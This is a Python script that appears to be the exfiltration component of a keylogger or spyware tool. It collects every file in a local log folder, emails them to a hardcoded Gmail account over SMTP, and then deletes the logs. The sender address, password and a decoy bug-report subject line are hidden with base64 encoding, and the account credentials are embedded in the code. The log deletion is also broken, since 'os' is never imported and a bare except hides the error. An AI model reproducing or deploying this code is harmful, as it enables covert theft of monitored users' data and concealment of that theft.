#!/usr/bin/env python3

from os import listdir
from os.path import isfile, join
import base64
import traceback

LOG = './log'

def main():
    dispatch_report()
    clear_logs()
    print('[*] report sent')

def dispatch_report():
    files = [(LOG + '/' + f) for f in listdir(LOG) if isfile(join(LOG, f))]
    try:
        email_files(files)
    except Exception:
        traceback.print_exc()

def clear_logs():
    files = [(LOG + '/' + f) for f in listdir(LOG) if isfile(join(LOG, f))]
    for f in files:
        try:
            os.remove(f)
        except:
            pass

def decode(string):
    return base64.b64decode(string).decode('utf-8')

def email_files(filenames):
    import email, smtplib, ssl
    from email import encoders
    from email.mime.base import MIMEBase
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText

    subject = decode('UGxlYXNlIHRyeSB0byBmaXggdGhpcw==')
    body = decode('VGhpcyBpcyB3YXkgdGhlIHRoaW5nIGlzIG5vdCB3b3JraW5n')
    sender_email = decode('dGpvcnZ1a0BnbWFpbC5jb20=')
    receiver_email = decode('dGpvcnZ1a0BnbWFpbC5jb20=')
    password = decode('emVyZ3J1c2g=') + '22'

    # Create a multipart message and set headers
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = subject
    message["Bcc"] = receiver_email  # Recommended for mass emails

    # Add body to email
    message.attach(MIMEText(body, "plain"))

    for filename in filenames:
        # Open PDF file in binary mode
        with open(filename, "rb") as attachment:
            # Add file as application/octet-stream
            # Email client can usually download this automatically as attachment
            part = MIMEBase("application", "octet-stream")
            part.set_payload(attachment.read())

        # Encode file in ASCII characters to send by email
        encoders.encode_base64(part)

        # Add header as key/value pair to attachment part
        part.add_header(
            "Content-Disposition",
            f"attachment; filename= {filename}",
        )

        # Add attachment to message and convert message to string
        message.attach(part)
    text = message.as_string()

    # Log in to server using secure context and send email
    context = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, text)
